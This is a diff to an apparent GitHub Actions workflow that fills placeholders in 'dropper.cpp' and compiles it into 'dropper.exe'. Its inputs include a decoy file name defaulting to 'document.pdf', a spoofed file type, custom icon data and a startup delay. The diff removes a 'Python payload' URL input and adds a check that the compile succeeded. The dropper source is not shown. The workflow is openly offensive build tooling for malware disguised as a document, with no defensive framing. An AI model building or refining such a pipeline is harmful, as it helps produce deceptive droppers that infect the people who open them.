@@ -7,9 +7,6 @@ on:
         description: 'File name for the dropper'
         required: true
         default: 'document.pdf'
-      payload_url:
-        description: 'URL of the Python payload'
-        required: true
       startup_delay_ms:
         description: 'Startup delay in milliseconds'
         required: false
@@ -38,7 +35,6 @@ jobs:
         run: |
           $content = Get-Content -Path dropper.cpp -Raw
           $content = $content -replace '{{FILE_NAME}}', '${{ github.event.inputs.file_name }}'
-          $content = $content -replace '{{PAYLOAD_URL}}', '${{ github.event.inputs.payload_url }}'
           $content = $content -replace '{{STARTUP_DELAY_MS}}', '${{ github.event.inputs.startup_delay_ms }}'
           $content = $content -replace '{{SPOOFED_FILE_TYPE}}', '${{ github.event.inputs.spoofed_file_type }}'
           if ('${{ github.event.inputs.icon_data }}' -ne '') {
@@ -55,6 +51,10 @@ jobs:
       - name: Compile dropper.cpp
         run: |
           cl.exe /O2 /out:dropper.exe dropper.cpp
+          if (-Not (Test-Path dropper.exe)) {
+              Write-Error "Compilation failed - dropper.exe not created"
+              exit 1
+          }
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
